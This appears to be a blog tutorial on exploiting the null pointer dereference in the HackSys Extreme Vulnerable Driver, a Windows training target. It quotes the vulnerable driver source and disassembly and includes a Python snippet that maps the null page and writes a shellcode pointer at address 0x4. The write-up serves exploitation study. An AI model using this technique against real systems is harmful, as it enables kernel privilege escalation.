---
layout: post
title:  "Windows Kernel Exploitation: Null Pointer Derefrence"
date:   2018-08-16 07:00:00
categories: windows-kernel-exploit
permalink: /archivers/Windows-Kernel-Exploitation-Null-Pointer-Derefrence
---
## Overview
pwn is fun.

It's interesting that we can figure out how to allocate memory which address is less than 0x1000. let's see how to do exploit null page with this magic tech.

### Environment
* Debugger OS: Win7 x64
* Debuggee OS: Win7 x86
* Debug software: Windbg, IDA

## Analysis
First check the [source code](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/NullPointerDerefrence.c).
```C
NullPointerDereference = (PNULL_POINTER_DEREFERENCE)
                                  ExAllocatePoolWithTag(NonPagedPool,
                                                        sizeof(NULL_POINTER_DEREFERENCE),
                                                        (ULONG)POOL_TAG);

        if (!NullPointerDereference) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(NULL_POINTER_DEREFERENCE));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);
        }

        // Get the value from user mode
        UserValue = *(PULONG)UserBuffer;

        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] NullPointerDereference: 0x%p\n", NullPointerDereference);

        // Validate the magic value
        if (UserValue == MagicValue) {
            NullPointerDereference->Value = UserValue;
            NullPointerDereference->Callback = &NullPointerDereferenceObjectCallback;

            DbgPrint("[+] NullPointerDereference->Value: 0x%p\n", NullPointerDereference->Value);
            DbgPrint("[+] NullPointerDereference->Callback: 0x%p\n", NullPointerDereference->Callback);
        }
        else {
            DbgPrint("[+] Freeing NullPointerDereference Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);

            // Free the allocated Pool chunk
            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);

            // Set to NULL to avoid dangling pointer
            NullPointerDereference = NULL;
        }

#ifdef SECURE
        // Secure Note: This is secure because the developer is checking if
        // 'NullPointerDereference' is not NULL before calling the callback function
        if (NullPointerDereference) {
            NullPointerDereference->Callback();
        }
#else
        DbgPrint("[+] Triggering Null Pointer Dereference\n");

        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
        // because the developer is not validating if 'NullPointerDereference' is NULL
        // before calling the callback function
        NullPointerDereference->Callback();
```
As we can see in the source code, everything is clearly explained in the source. The `UserValue` is compared with the value `0xBAD0B0B0` and if it fails the `NullPointerDereference` value is set to NULL and then the value `NullPointerDereference` is not validated whether it’s NULL before calling the callback function. 

let's see it in disassemble language.
```C
                xor     esi, esi ; the esi reg is NullPointerDerefrence pointer
                push    offset aTriggeringNull ; "[+] Triggering Null Pointer Dereference"...
                call    _DbgPrint
                pop     ecx
                call    dword ptr [esi+4]
```
Because the `NullPointerDereference` is set to NULL, so the call `call    dword ptr [esi+4]` turn into `call [0x4]`, this is the vuln.

## Explotation
As mentioned before, Win7 OS doesn't have SMEP or SMAP, we can execute our shellcode directly. What we need to do is that allocate memory less than 0x1000.  
### How to allocate memory less than 0x1000
Functions such as `VirtualAlloc` or `VirtualAllocEx` won’t allow us to allocate memory at a starting address less than 0x00001000. Thanks for researchers' researching and sharing. There is a NTAPI undocumented function `NtAllocateVirtualMemory`. We can use this function to map a null page in user space and after that, we can write the pointer to shellcode at address 0x00000004.

Below is the example code to allocate value in 0x4:
```PYTHON
def Allocate_NULL_page(shellcode_address):
    
    
    null_status = NtAllocateVirtualMemory(GetCurrentProcess(), byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000,  0x40)
    if null_status != 0x0:
            print "\t[+] Failed to allocate NULL page..."
            sys.exit(-1)
    else:
            print "\t[+] NULL Page Allocated"

    ptr=c_void_p(0x4)
    ptr.contents=c_int(shellcode_address)
    
    memmove(c_void_p(0x4), byref(c_ulong(shellcode_address)), 4)
```
 

### Code
As we can allocate memory in null page, the exp is very simple. First allocate memory for shellcode and then put the address to 0x4. pwned!
The full exp code is in my [Github](https://github.com/ray-cp/windows-kernel-exploit/tree/master/HEVD/NULL_Pointer_Dereference/Win7_x86)
## Conclude
So much things need to learn and thanks for researchers' sharing.
## Link
1. [HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
2. [Windows Kernel Exploitation Tutorial Part 5: NULL Pointer Dereference)](https://rootkits.xyz/blog/2018/01/kernel-null-pointer-dereference/)
3. [Windows Kernel Exploitation – Null Pointer Dereference](https://osandamalith.com/2017/06/22/windows-kernel-exploitation-null-pointer-dereference/)
4. [Part 12: Kernel Exploitation -> Null Pointer Dereference](https://www.fuzzysecurity.com/tutorials/expDev/16.html)